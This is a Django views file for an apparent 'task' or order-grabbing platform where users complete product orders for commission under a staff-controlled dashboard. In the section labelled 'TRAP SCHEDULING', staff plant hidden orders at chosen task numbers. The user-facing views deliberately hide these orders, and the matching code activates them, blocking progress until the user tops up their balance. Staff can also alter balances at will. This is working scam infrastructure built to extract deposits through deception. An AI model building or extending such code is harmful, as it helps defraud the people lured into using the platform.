import random
from decimal import Decimal
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.models import User
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm, SetPasswordForm
from django.contrib.auth import login, logout
from django.contrib.admin.views.decorators import staff_member_required
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.db.models import Q, Sum
from django.db import transaction
from .models import Profile, Order
from django.db.models import Case, When, Value, IntegerField
from django.urls import reverse
from .forms import UserRegistrationForm

# --- 1. GENERAL ---
def home(request):
    return render(request, 'home.html')

# --- 2. STAFF AUTHENTICATION ---
def staff_login(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid() and form.get_user().is_staff:
            login(request, form.get_user())
            return redirect('staffs')
    return render(request, 'staffs/staffs_login.html', {'form': AuthenticationForm()})

def staff_logout(request):
    logout(request)
    return redirect('staff_login')

# --- 3. STAFF DASHBOARD ---
@staff_member_required(login_url='staff_login')
def staffs(request):
    users = User.objects.filter(is_staff=False, is_superuser=False).select_related('profile')
    task_templates = Order.objects.filter(user__isnull=True).order_by('-created_at')
    user_logs = Order.objects.filter(user__isnull=False).select_related('user', 'user__profile').order_by('-created_at')
    
    search_query = request.GET.get('search', '')
    if search_query:
        users = users.filter(Q(username__icontains=search_query) | Q(profile__phone_number__icontains=search_query))

    order_search_query = request.GET.get('order_search', '')
    if order_search_query:
        user_logs = user_logs.filter(Q(user__username__icontains=order_search_query))

    total_profit = user_logs.filter(status='completed').aggregate(Sum('profit'))['profit__sum'] or 0
    
    return render(request, 'staffs/staffs_main.html', {
        'users': users, 
        'task_templates': task_templates,
        'user_logs': user_logs,
        'total_profit': total_profit.quantize(Decimal('0.01')),
        'search_query': search_query,
        'order_search_query': order_search_query
    })

# --- 4. STAFF SIDE: USER MANAGEMENT ---
@staff_member_required(login_url='staff_login')
def add_user(request):
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        phone = request.POST.get('phone')
        if form.is_valid():
            user = form.save()
            profile = user.profile
            profile.phone_number = phone
            profile.save()
            messages.success(request, f"User {user.username} created successfully.")
            return redirect('staffs')
    else:
        form = UserCreationForm()
    return render(request, 'staffs/add_user.html', {'form': form})

@staff_member_required(login_url='staff_login')
def edit_user(request, user_id):
    user_to_edit = get_object_or_404(User, id=user_id)
    password_form = SetPasswordForm(user_to_edit)
    if request.method == 'POST':
        if 'update_info' in request.POST:
            user_to_edit.username = request.POST.get('username')
            user_to_edit.save()
            profile = user_to_edit.profile
            profile.phone_number = request.POST.get('phone')
            profile.current_progress = int(request.POST.get('current_progress', 0))
            profile.save()
            messages.success(request, "Profile updated!")
        elif 'update_password' in request.POST:
            password_form = SetPasswordForm(user_to_edit, request.POST)
            if password_form.is_valid():
                password_form.save()
                messages.success(request, "Password reset!")
        return redirect('edit_user', user_id=user_id)
    return render(request, 'staffs/edit_user.html', {'user_to_edit': user_to_edit, 'password_form': password_form})

@staff_member_required(login_url='staff_login')
def reset_user_orders(request, user_id):
    user_to_reset = get_object_or_404(User, id=user_id)
    profile = user_to_reset.profile
    profile.current_progress = 0
    profile.save()
    messages.success(request, f"Progress for {user_to_reset.username} reset to 0.")
    return redirect('staffs')

@staff_member_required(login_url='staff_login')
def delete_user(request, user_id):
    get_object_or_404(User, id=user_id).delete()
    return redirect('staffs')

@staff_member_required(login_url='staff_login')
def adjust_balance(request, user_id):
    if request.method == 'POST':
        user = get_object_or_404(User, id=user_id)
        profile = user.profile
        amount = Decimal(request.POST.get('amount', '0'))
        if request.POST.get('action') == 'add': profile.balance += amount
        else: profile.balance -= amount
        profile.save()
    return redirect('staffs')

# --- 5. STAFF SIDE: ORDER TEMPLATES ---
@staff_member_required(login_url='staff_login')
def add_order_staff(request):
    if request.method == 'POST':
        Order.objects.create(
            product_name=request.POST.get('product_name'),
            price=Decimal(request.POST.get('price')),
            commission_rate=Decimal(request.POST.get('commission_rate', '0'))
        )
        return redirect('staffs')
    return render(request, 'staffs/add_order.html')

@staff_member_required(login_url='staff_login')
def edit_order_staff(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        order.product_name = request.POST.get('product_name')
        order.price = Decimal(request.POST.get('price'))
        order.commission_rate = Decimal(request.POST.get('commission_rate'))
        order.save()
        return redirect('staffs')
    return render(request, 'staffs/edit_order.html', {'order': order})

@staff_member_required(login_url='staff_login')
def delete_order_staff(request, order_id):
    get_object_or_404(Order, id=order_id).delete()
    return redirect('staffs')

# --- 6. STAFF SIDE: TRAP SCHEDULING ---
@staff_member_required(login_url='staff_login')
def manual_assign_order(request, user_id):
    target_user = get_object_or_404(User, id=user_id)
    templates = Order.objects.filter(user__isnull=True).order_by('price')
    scheduled_orders = target_user.orders.filter(scheduled_at__isnull=False).order_by('scheduled_at')

    if request.method == 'POST':
        if 'delete_scheduled' in request.POST:
            get_object_or_404(Order, id=request.POST.get('order_id'), user=target_user).delete()
        else:
            template = get_object_or_404(Order, id=request.POST.get('template_id'))
            Order.objects.create(
                user=target_user,
                product_name=template.product_name,
                price=template.price,
                commission_rate=template.commission_rate,
                status='scheduled',  # Hidden trap
                scheduled_at=int(request.POST.get('target_num'))
            )
        return redirect('manual_assign_order', user_id=user_id)
    return render(request, 'staffs/manual_assign.html', {'target_user': target_user, 'templates': templates, 'scheduled_orders': scheduled_orders})

# --- 7. USER AUTHENTICATION ---
def user_login(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            login(request, form.get_user())
            return redirect('user_dashboard')
    return render(request, 'users/user_login.html', {'form': AuthenticationForm()})

def user_logout(request):
    logout(request)
    return redirect('user_login')

# --- 8. USER VIEWS ---
@login_required(login_url='user_login')
def user_dashboard(request):
    return render(request, 'users/home.html', {'profile': request.user.profile})

@login_required(login_url='user_login')
def user_order(request):
    # Strictly exclude hidden traps from the summary view
    orders = request.user.orders.exclude(status='scheduled').order_by('-created_at')
    return render(request, 'users/order.html', {
        'profile': request.user.profile, 
        'orders': orders, 
        'order_count': request.user.profile.current_progress, 
        'max_orders': 40
    })

@login_required(login_url='user_login')
def user_record(request):
    profile = request.user.profile
    status_filter = request.GET.get('status')
    
    # 1. Exclude 'scheduled' (the hidden traps)
    # 2. Add a 'priority' number: Pending = 1, Completed = 2
    # 3. Sort by priority first, then date
    orders = request.user.orders.exclude(status='scheduled').annotate(
        priority=Case(
            When(status='pending', then=Value(1)),
            When(status='completed', then=Value(2)),
            default=Value(3),
            output_field=IntegerField(),
        )
    ).order_by('priority', '-created_at')

    if status_filter in ['pending', 'completed']:
        orders = orders.filter(status=status_filter)
        
    return render(request, 'users/record.html', {
        'profile': profile, 
        'orders': orders, 
        'current_status': status_filter
    })
# --- 9. MATCHING ENGINE ---
@login_required(login_url='user_login')
def start_matching(request):
    profile = request.user.profile
    if profile.current_progress >= 40:
        messages.error(request, "Daily limit reached.")
        return redirect('user_order')

    current_num = profile.current_progress + 1

    # CHECK FOR HIDDEN TRAP
    trap = request.user.orders.filter(status='scheduled', scheduled_at=current_num).first()
    if trap:
        trap.status = 'pending' # ACTIVATE
        trap.save()
        return render(request, 'users/confirm_order.html', {'order': trap, 'profile': profile})

    # CHECK FOR EXISTING PENDING
    pending = request.user.orders.filter(status='pending').first()
    if pending:
        return render(request, 'users/confirm_order.html', {'order': pending, 'profile': profile})

    if profile.balance < 10:
        messages.error(request, "Minimum $10 required.")
        return redirect('user_order')

    templates = Order.objects.filter(user__isnull=True, price__lte=profile.balance)
    if not templates.exists():
        messages.error(request, "No suitable tasks found.")
        return redirect('user_order')

    temp = random.choice(templates)
    order = Order.objects.create(
        user=request.user, 
        product_name=temp.product_name,
        price=temp.price, 
        commission_rate=temp.commission_rate, 
        status='pending'
    )
    return render(request, 'users/confirm_order.html', {'order': order, 'profile': profile})

@login_required(login_url='user_login')
def complete_order(request, order_id):
    if request.method == 'POST':
        try:
            with transaction.atomic():
                # Get the order and lock it for the update
                order = get_object_or_404(Order.objects.select_for_update(), id=order_id, user=request.user)
                profile = request.user.profile
                
                # 1. Check if already completed
                if order.status == 'completed':
                    messages.info(request, "This order is already completed.")
                    return redirect('user_order')

                # 2. Check if balance is enough
                if profile.balance < order.price:
                    messages.error(request, "Insufficient funds to complete this task. Please top up your balance.")
                    # Redirect to record page with 'pending' filter
                    return redirect(f"{reverse('user_record')}?status=pending")

                # 3. Successful Completion Logic
                # Profit is calculated as (Price * Commission Rate / 100)
                # Note: In most systems, the user gets their Price back PLUS the profit
                profile.balance += order.profit 
                
                order.status = 'completed'
                order.save()
                
                # Increment progress count
                profile.current_progress += 1
                profile.save()
                
                messages.success(request, f"Order completed successfully! Profit: ${order.profit}")
                
                # RETURN TO SMART MATCH PAGE
                return redirect('user_order')

        except Exception as e:
            messages.error(request, "An error occurred while processing the order.")
            return redirect('user_record')

    # If someone tries to access via GET, send them to records
    return redirect('user_record')

@login_required(login_url='user_login')
def user_wallet(request):
    return render(request, 'users/wallet.html', {'profile': request.user.profile})

@login_required(login_url='user_login')
def user_settings(request):
    return render(request, 'users/settings.html', {'profile': request.user.profile})


def user_register(request):
    if request.method == 'POST':
        form = UserRegistrationForm(request.POST) # Use custom form
        if form.is_valid():
            user = form.save() # This saves the User object
            
            # Save the phone number to the Profile
            phone = form.cleaned_data.get('phone_number')
            profile = user.profile  # Assuming your Profile model is created via signals
            profile.phone_number = phone
            profile.save()
            
            messages.success(request, f'Account created! You can now login.')
            return redirect('user_login')
    else:
        form = UserRegistrationForm() # Use custom form
    
    return render(request, 'users/user_register.html', {'form': form})